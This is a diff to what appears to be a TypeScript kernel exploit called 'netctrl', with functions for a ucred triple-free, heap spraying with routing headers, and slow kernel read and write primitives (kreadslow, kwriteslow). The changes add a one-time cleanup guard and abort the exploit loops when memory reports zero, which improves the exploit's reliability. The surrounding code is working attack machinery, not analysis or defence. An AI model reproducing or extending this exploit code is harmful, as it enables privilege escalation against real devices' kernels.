@@ -656,6 +656,7 @@ function init () {
 
 let prev_core: number = -1
 let prev_rtprio: number = -1
+let cleanup_called: boolean = false
 
 function setup () {
   debug('Preparing netctrl...')
@@ -733,6 +734,8 @@ function setup () {
 }
 
 function cleanup (kill_workers = false) {
+  if (cleanup_called) return
+  cleanup_called = true
   debug('Cleaning up...')
 
   // Close ipv6 sockets first (not blocking)
@@ -815,12 +818,23 @@ function find_twins () {
   let val
   let i
   let j
+  let zeroMemoryCount = 0
 
   // Minimizing the usage of BigInt class
   const spray_add = spray_rthdr.add(0x04)
   const lead_add = leak_rthdr.add(0x04)
 
   while (count < MAX_ROUNDS_TWIN) {
+    if (debugging.info.memory.available === 0) {
+      zeroMemoryCount++
+      if (zeroMemoryCount >= 5) {
+        log('netctrl failed!')
+        cleanup()
+        return false
+      }
+    } else {
+      zeroMemoryCount = 0
+    }
     if (count % 10 === 0) {
       // debug("find_twins iteration: " + count);
     }
@@ -1316,6 +1330,9 @@ function trigger_ucred_triplefree () {
     end = find_twins()
 
     if (!end) {
+      if (cleanup_called) {
+        throw new Error('Netctrl failed - Reboot and try again')
+      }
       // Clean up and start again
       close(new BigInt(uaf_socket))
       continue
@@ -1513,8 +1530,19 @@ function kreadslow (addr: BigInt, size: number) {
   const uio_leak_add = leak_rthdr.add(0x08)
 
   let count = 0
+  let zeroMemoryCount = 0
   // Reclaim with uio.
   while (count < 10000) {
+    if (debugging.info.memory.available === 0) {
+      zeroMemoryCount++
+      if (zeroMemoryCount >= 5) {
+        log('netctrl failed!')
+        cleanup()
+        return BigInt_Error
+      }
+    } else {
+      zeroMemoryCount = 0
+    }
     count++
     trigger_uio_writev() // COMMAND_UIO_READ in fl0w's
     sched_yield()
@@ -1566,7 +1594,18 @@ function kreadslow (addr: BigInt, size: number) {
   const iov_leak_add = leak_rthdr.add(0x20)
 
   // Reclaim uio with iov.
+  let zeroMemoryCount2 = 0
   while (true) {
+    if (debugging.info.memory.available === 0) {
+      zeroMemoryCount2++
+      if (zeroMemoryCount2 >= 5) {
+        log('netctrl failed!')
+        cleanup()
+        return BigInt_Error
+      }
+    } else {
+      zeroMemoryCount2 = 0
+    }
     // Reclaim with iov.
     trigger_iov_recvmsg()
     sched_yield()
@@ -1655,7 +1694,18 @@ function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
   const uio_leak_add = leak_rthdr.add(0x08)
 
   // Reclaim with uio.
+  let zeroMemoryCount = 0
   while (true) {
+    if (debugging.info.memory.available === 0) {
+      zeroMemoryCount++
+      if (zeroMemoryCount >= 5) {
+        log('netctrl failed!')
+        cleanup()
+        return BigInt_Error
+      }
+    } else {
+      zeroMemoryCount = 0
+    }
     trigger_uio_readv() // COMMAND_UIO_WRITE in fl0w's
     sched_yield()
 
@@ -1696,7 +1746,18 @@ function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
   const iov_leak_add = leak_rthdr.add(0x20)
 
   // Reclaim uio with iov.
+  let zeroMemoryCount2 = 0
   while (true) {
+    if (debugging.info.memory.available === 0) {
+      zeroMemoryCount2++
+      if (zeroMemoryCount2 >= 5) {
+        log('netctrl failed!')
+        cleanup()
+        return BigInt_Error
+      }
+    } else {
+      zeroMemoryCount2 = 0
+    }
     // Reclaim with iov.
     trigger_iov_recvmsg()
     sched_yield()
